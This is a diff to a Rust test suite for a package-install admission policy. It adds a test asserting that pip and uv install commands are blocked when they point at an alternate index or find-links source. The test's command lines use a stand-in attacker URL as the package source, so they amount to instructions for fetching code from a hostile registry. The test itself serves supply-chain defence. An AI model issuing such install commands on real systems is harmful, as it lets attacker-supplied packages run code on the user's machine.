@@ -85,6 +85,63 @@ fn pypi_install_cannot_disable_reviewed_registry_index() {
 }
 
 #[test]
+fn pypi_install_cannot_override_reviewed_registry_or_add_artifact_source() {
+    let artifact_argument = format!("{PACKAGE_NAME}=={PACKAGE_VERSION}");
+    let hostile_source = "https://attacker.invalid/simple";
+
+    for (executable, source_option) in [
+        ("pip", format!("--index-url={hostile_source}")),
+        ("pip3", format!("--extra-index-url={hostile_source}")),
+        ("pip", format!("--find-links={hostile_source}")),
+        ("uv", format!("--default-index={hostile_source}")),
+        ("uv", format!("--index={hostile_source}")),
+        ("uv", format!("--index-url={hostile_source}")),
+        ("uv", format!("--extra-index-url={hostile_source}")),
+        ("uv", format!("--find-links={hostile_source}")),
+    ] {
+        let mut policy = approved_pypi_policy(&artifact_argument);
+        policy.allowed_executables = vec![executable.to_string()];
+        let mut intent = approved_pypi_intent(&artifact_argument);
+        intent.argv = match executable {
+            "pip" | "pip3" => vec![
+                executable.to_string(),
+                "install".to_string(),
+                artifact_argument.clone(),
+                "--require-hashes".to_string(),
+                "--no-deps".to_string(),
+                "--no-input".to_string(),
+                source_option.clone(),
+            ],
+            "uv" => vec![
+                "uv".to_string(),
+                "pip".to_string(),
+                "install".to_string(),
+                artifact_argument.clone(),
+                "--require-hashes".to_string(),
+                "--no-deps".to_string(),
+                source_option.clone(),
+            ],
+            _ => unreachable!("test executable set is closed"),
+        };
+
+        let decision = admission_decision(&policy, &intent);
+
+        assert_eq!(
+            decision.decision,
+            DecisionKind::Block,
+            "{executable} source selector {source_option:?} must not override the reviewed registry/source authority"
+        );
+        assert!(
+            decision
+                .reason_codes
+                .contains(&ReasonCode::AlternateTrustRoot),
+            "caller-selected package sources must be classified as alternate trust/source authority: {:?}",
+            decision.reason_codes
+        );
+    }
+}
+
+#[test]
 fn exact_pypi_index_name_and_version_remain_allowed() {
     let artifact_argument = format!("{PACKAGE_NAME}=={PACKAGE_VERSION}");
     let policy = approved_pypi_policy(&artifact_argument);
